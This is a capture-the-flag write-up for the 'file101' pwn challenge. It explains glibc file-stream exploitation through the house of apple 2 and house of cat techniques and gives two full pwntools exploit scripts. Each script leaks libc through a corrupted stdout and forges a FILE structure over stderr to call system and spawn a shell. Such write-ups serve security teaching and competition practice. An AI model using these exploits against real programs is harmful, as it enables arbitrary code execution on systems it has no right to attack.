# file101

Attachment:

```c
#include <stdio.h>

void main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  puts("stdout:");
  scanf("%224s", (char*)stdout);
  puts("stderr:");
  scanf("%224s", (char*)stderr);
}
```

We can write data to `stdout` and `stderr`, which allows for file stream oriented programming, specifically [house of apple 2](https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/) or [house of cat](https://bbs.kanxue.com/thread-273895.htm).

Heavily inspired by [BlackHat MEA 2025 Writeup - pwn by @Rosayxy](https://rosayxy.github.io/blackhat-mea-2025-writeup-pwn/).

## House of apple 2

Steps:

1. Override the lowest byte of `stdout._IO_write_base` to zero, so that internal data of `stdout` is leaked via stdout
2. Based on leaked data, we know the base address of libc, construct the house of apple 2 payload using the libc base address with some modifications:
    1. `scanf` stops when `0x20` is encountered, so `fake_file->file._flags` is set to `"aa;sh\x00"` instead of the typical `"\x20sh\x00"`
    2. the offset of `_wide_vtable` within `fake_file->file._wide_data` is 0xE0, which overflows the input limitation of `%224s`; so we point `fake_file->file._wide_data` to `fake_file - 0x10` instead
3. Send the payload to get shell

Typical house of apple 2 payload:

```python
payload = flat(
    {
        # fake_file->file._flags
        # requirements:
        # (_flags & 0x0002) == 0
        # (_flags & 0x0008) == 0
        # (_flags & 0x0800) == 0
        # basic approach with spaces:
        # " sh\x00"
        # 0x20, 0x73, 0x68, 0x00
        0x00: b" sh\x00",
        # fake_file->file._wide_data->_IO_write_base
        0x18: p64(0),
        # fake_file->file._IO_write_base
        0x20: p64(0),
        # fake_file->file._IO_write_ptr
        0x28: p64(1),
        # fake_file->file._wide_data->_IO_buf_base
        0x30: p64(0),
        # fake_file->file._wide_data->_wide_vtable->__doallocate
        0x68: libc.symbols["system"],
        # fake_file->file._lock
        0x88: libc_unstrip.symbols["_IO_stdfile_0_lock"],
        # fake_file->file._wide_data
        0xA0: fake_file,
        # fake_file->file._mode
        0xC0: p64(0),
        # fake_file->vtable
        0xD8: libc.symbols["_IO_wfile_jumps"],
        # fake_file->file._wide_data->_wide_vtable
        0xE0: fake_file,
    }
)
```

Modified payload for this challenge:

```python
payload = flat(
    {
        # fake_file->file._flags
        # requirements:
        # (_flags & 0x0002) == 0
        # (_flags & 0x0008) == 0
        # (_flags & 0x0800) == 0
        # without spaces:
        # 0x61, 0x61, 0x3b, 0x73, 0x68, 0x00
        0x00: b"aa;sh\x00",
        # fake_file->file._wide_data->_IO_write_base
        0x08: p64(0),
        # fake_file->file._IO_write_base
        # fake_file->file._wide_data->_IO_buf_base
        0x20: p64(0),
        # fake_file->file._IO_write_ptr
        0x28: p64(1),
        # fake_file->file._wide_data->_wide_vtable->__doallocate
        0x68: libc.symbols["system"],
        # fake_file->file._lock
        0x88: libc_unstrip.symbols["_IO_stdfile_0_lock"],
        # fake_file->file._wide_data
        0xA0: fake_file - 0x10,
        # fake_file->file._mode
        0xC0: p64(0),
        # fake_file->file._wide_data->_wide_vtable
        0xD0: fake_file,
        # fake_file->vtable
        0xD8: libc.symbols["_IO_wfile_jumps"],
    }
)
```

Attack:

```python
from pwn import *
from pwnlib.libcdb import search_by_build_id

elf = ELF("./chall")
libc = elf.libc
# get debug symbols for libc
libc_unstrip_filename = search_by_build_id(libc.buildid.hex(), unstrip=True)
libc_unstrip = ELF(libc_unstrip_filename)
context.binary = elf
context.terminal = ["tmux", "split-w", "-h"]
context(arch="amd64", os="linux", log_level="debug")

p = process("./chall")

# house of apple 2
# https://www.roderickchan.cn/zh-cn/house-of-apple-一种新的glibc中io攻击方法-2/

# gdb.attach(p)
# pause()

# libc leak
# https://rosayxy.github.io/blackhat-mea-2025-writeup-pwn/
p.recvuntil(b"stdout:\n")
# 0xFBAD1800:
# _IO_MAGIC
# _IO_IS_APPENDING
# _IO_CURRENTLY_PUTTING
# override lowest byte of _IO_write_base to 0x00
# so that data is leaked within stdout
p.sendline(p64(0xFBAD1800) + p64(0) * 3)
# using local libc here, offset can be different from remote
# data starting from &stdout[0x40] is printed
p.recv(0x28)
# &stdout[0x68]: _chain, stdout->file._chain is stdin
libc_leak = u64(p.recv(6).ljust(8, b"\x00"))
libc_addr = libc_leak - libc.symbols["_IO_2_1_stdin_"]

libc.address = libc_addr
libc_unstrip.address = libc_addr
print("libc", hex(libc_addr))

# construct payload for house of apple2
# using stderr as fake_file
fake_file = libc.symbols["_IO_2_1_stderr_"]
payload = flat(
    {
        # fake_file->file._flags
        # requirements:
        # (_flags & 0x0002) == 0
        # (_flags & 0x0008) == 0
        # (_flags & 0x0800) == 0
        # basic approach with spaces:
        # " sh\x00"
        # 0x20, 0x73, 0x68, 0x00
        # 0x00: b" sh\x00",
        # without spaces:
        # 0x61, 0x61, 0x3b, 0x73, 0x68, 0x00
        0x00: b"aa;sh\x00",
        # fake_file->file._wide_data->_IO_write_base
        0x08: p64(0),
        # fake_file->file._IO_write_base
        # fake_file->file._wide_data->_IO_buf_base
        0x20: p64(0),
        # fake_file->file._IO_write_ptr
        0x28: p64(1),
        # fake_file->file._wide_data->_wide_vtable->__doallocate
        0x68: libc.symbols["system"],
        # fake_file->file._lock
        0x88: libc_unstrip.symbols["_IO_stdfile_0_lock"],
        # fake_file->file._wide_data
        0xA0: fake_file - 0x10,
        # fake_file->file._mode
        0xC0: p64(0),
        # fake_file->file._wide_data->_wide_vtable
        0xD0: fake_file,
        # fake_file->vtable
        0xD8: libc.symbols["_IO_wfile_jumps"],
    }
)
p.recvuntil("stderr:")
p.send(payload)

p.interactive()
```

## House of cat

Another approach, as done in [BlackHat MEA 2025 Writeup - pwn by @Rosayxy](https://rosayxy.github.io/blackhat-mea-2025-writeup-pwn/), is to use house of cat. The original house of cat payload overflows, so by moving `_wide_data` to `fake_file - 0x10` and `_wide_data->_wide_vtable` to `fake_file + 0x48`, we can avoid overflow and `\x20` byte in the payload:

```python
from pwn import *
from pwnlib.libcdb import search_by_build_id

elf = ELF("./chall")
libc = elf.libc
# get debug symbols for libc
libc_unstrip_filename = search_by_build_id(libc.buildid.hex(), unstrip=True)
libc_unstrip = ELF(libc_unstrip_filename)
context.binary = elf
context.terminal = ["tmux", "split-w", "-h"]
context(arch="amd64", os="linux", log_level="debug")

p = process("./chall")

# house of cat
# https://bbs.kanxue.com/thread-273895.htm

# gdb.attach(p)
# pause()

# libc leak
p.recvuntil(b"stdout:\n")
# 0xFBAD1800:
# _IO_MAGIC
# _IO_IS_APPENDING
# _IO_CURRENTLY_PUTTING
# override lowest byte of _IO_write_base to 0x00
# so that data is leaked within stdout
p.sendline(p64(0xFBAD1800) + p64(0) * 3)
# using local libc here, offset can be different from remote
# data starting from &stdout[0x40] is printed
p.recv(0x28)
# &stdout[0x68]: _chain, stdout->file._chain is stdin
libc_leak = u64(p.recv(6).ljust(8, b"\x00"))
libc_addr = libc_leak - libc.symbols["_IO_2_1_stdin_"]

libc.address = libc_addr
libc_unstrip.address = libc_addr
print("libc", hex(libc_addr))

# construct payload for house of cat
# using stderr as fake_file
fake_file = libc.symbols["_IO_2_1_stderr_"]
payload = flat(
    {
        # fake_file->file._flags
        0x00: b"sh\x00",
        # fake_file->file._wide_data->_IO_write_base
        0x08: p64(0),
        # fake_file->file._wide_data->_IO_write_ptr
        0x10: p64(1),
        # fake_file->file._wide_data->_wide_vtable->__overflow
        0x60: p64(libc.symbols["system"]),
        # fake_file->file._lock
        0x88: p64(libc_unstrip.symbols["_IO_stdfile_0_lock"]),
        # fake_file->file._wide_data
        0xA0: p64(fake_file - 0x10),
        # fake_file->file._mode
        0xC0: p64(1),
        # fake_file->file._wide_data->_wide_vtable
        0xD0: p64(fake_file + 0x48),
        # fake_file->vtable
        0xD8: p64(libc.symbols["_IO_wfile_jumps"] + 0x30),
    }
)
p.recvuntil("stderr:")
p.send(payload)

p.interactive()
```
